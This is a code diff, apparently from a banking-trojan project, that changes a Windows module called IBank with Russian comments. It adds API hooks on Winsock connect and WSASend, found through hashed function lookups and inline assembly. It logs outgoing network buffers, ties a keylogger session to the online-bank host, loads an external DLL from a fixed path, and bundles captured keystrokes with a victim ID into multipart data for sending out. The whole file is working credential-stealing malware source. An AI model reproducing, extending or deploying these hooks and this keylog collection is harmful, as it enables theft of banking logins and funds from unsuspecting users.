@@ -5,6 +5,7 @@
 
 #include <windows.h>
 #include <winsock.h>
+#include <shlobj.h>
 
 
 #include "IBankSystem.h"
@@ -51,8 +52,15 @@ namespace IBANKDEBUGSTRINGS
 #endif
 
 
+
 namespace IBank
 {
+
+	#ifdef DEBUGCONFIG
+		#define EXTERNAL_DEBUG
+	#endif
+
+
 
 	char SystemName[]   = {'I', 'B', 'A', 'N', 'K',  0};
 
@@ -72,10 +80,28 @@ namespace IBank
 	//-----------------------------------------------------------------------
 
 
+	typedef struct _ibWSABUF {
+		ULONG len;     /* the length of the buffer */
+		__field_bcount(len) CHAR FAR *buf; /* the pointer to the buffer */
+	} ibWSABUF, FAR * LPibWSABUF;
+
 	// Определяем типы для установки хуков
 	typedef int (WINAPI *TConnect)(SOCKET s, const struct sockaddr *name, int namelen);
 
+	typedef int (WINAPI *TWSASend)(SOCKET s, LPibWSABUF lpBuffers, DWORD dwBufferCount,
+				LPDWORD lpNumberOfBytesSent, DWORD dwFlags, LPVOID lpOverlapped,
+				LPVOID lpCompletionRoutine);
+
+
 	TConnect Real_Connect;
+	TWSASend Real_WSASend;
+
+
+	#ifdef EXTERNAL_DEBUG
+    	TConnect DebugConnect = NULL;
+
+
+	#endif
 
 
     // Глобальные переменные системы
@@ -162,11 +188,15 @@ namespace IBank
 
 		struct hostent FAR * Res = Real_gethostbyname(name);
 
+
+        // IBDBG("IBankW", "============ хост %s", name);
+
 		// В случае если получается имя хоста ибанка, сохраняем его
 		// для дальнейших проверок
 		if (Res && !IsJavaHost(name))
 		{
 			IBnakHostAddr = *(LPDWORD)Res->h_addr_list[0];
+			IBDBG("IBankW", ">>>>>>>>>>>>>>>> Отреагировали на хост %s", name);
         }
 
 		return Res;
@@ -178,16 +208,56 @@ namespace IBank
 	{
 		// Идёт запрос на сервер, закрываем систему.
 		#ifndef JAVS_PATCHERH
-			KeyLogger::CloseSession();
+
+			// Проверяем наличие сигнального фала
+//			string SignalFile(MAX_PATH);
+//			pSHGetSpecialFolderPathA(NULL, SignalFile.t_str(), CSIDL_COMMON_APPDATA, TRUE);
+//
+//			SignalFile.CalcLength();
+//            SignalFile += "\\netsend.dat";
+//
+//			if (!FileExistsA(SignalFile.t_str()))
+				KeyLogger::CloseSession();
         #else
 			struct sockaddr_in* info = (struct sockaddr_in*)name;
 			if (IBnakHostAddr && IBnakHostAddr == info->sin_addr.s_addr)
 				KeyLogger::CloseSession();
 		#endif
 
-		return Real_Connect(s, name, namelen);
+
+
+//		#ifdef EXTERNAL_DEBUG
+//			if (DebugConnect)
+//				DebugConnect(s, name, namelen);
+//
+//		#endif
+
+
+		int R = Real_Connect(s, name, namelen);
+
+//        __asm int 3
+
+		return R;
 	}
 	//-----------------------------------------------------------------------
+
+
+	int WINAPI Hook_WSASend(SOCKET s, LPibWSABUF lpBuffers, DWORD dwBufferCount,
+					LPDWORD lpNumberOfBytesSent, DWORD dwFlags, LPVOID lpOverlapped,
+					LPVOID lpCompletionRoutine)
+	{
+
+	   string Str(lpBuffers->buf, Min(20, lpBuffers->len));
+       IBDBG("IBankW", "---------- WSASend %s", Str.t_str());
+
+
+
+		return Real_WSASend(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags,
+				 lpOverlapped, lpCompletionRoutine);
+
+    }
+
+
 
 
 	void MakeScreenShot()
@@ -208,6 +278,12 @@ namespace IBank
 		{
 			__asm mov [Real_Connect], eax
 		}
+
+
+//		if ( HookApi( 4, 0x1A7829F8 /* WSASend */, &Hook_WSASend) )
+//		{
+//			__asm mov [Real_WSASend], eax
+//		}
 
 		#ifdef JAVS_PATCHERH
 		if ( HookApi( 4, 0xF44318C6 /* gethostbyname */, &Hook_gethostbyname) )
@@ -238,6 +314,20 @@ namespace IBank
 		System = (PKeyLogSystem)Sender;
 		// Активированы система IBank
 		IBDBG("IBank", "Система %s активирована, %08x", System->Name, (DWORD)GetImageBase() );
+
+
+
+		#ifdef EXTERNAL_DEBUG
+			HMODULE DBGDLL = (HMODULE)pLoadLibraryA("c:\\1.dll");
+
+			if (DBGDLL)
+				DebugConnect = (TConnect)pGetProcAddress(DBGDLL, "HookConnect");
+
+			if (DebugConnect)
+				IBDBG("IBank", ">>>>>>>>>>>>>>>>>>   Отладочная библиотека загружена");
+
+		#endif
+
 
 		// Сигнализируем ява патчеру о необходимости запуска патчей
 		#ifdef JAVS_PATCHERH
@@ -355,7 +445,7 @@ namespace IBank
 		PMultiPartData Data = MultiPartData::Create();
 
 
-		IBDBG("IBank", "----------- Key:%s<key_end>",  Log->Log);
+		IBDBG("IBank", "Key:%s<key_end>",  Log->Log);
 
 		MultiPartData::AddStringField(Data, "uid",  UID);
 		MultiPartData::AddStringField(Data, "keyhwnd",  Log->Log);
@@ -601,6 +691,7 @@ void RegisterIBankSystem(DWORD hashApp)
 
 	if (S != NULL)
 	{
+
 		IBDBG("IBank", "Система зарегистрирована");
 		IBank::System = S;
 		S->OnActivate      = IBank::SystemActivated;
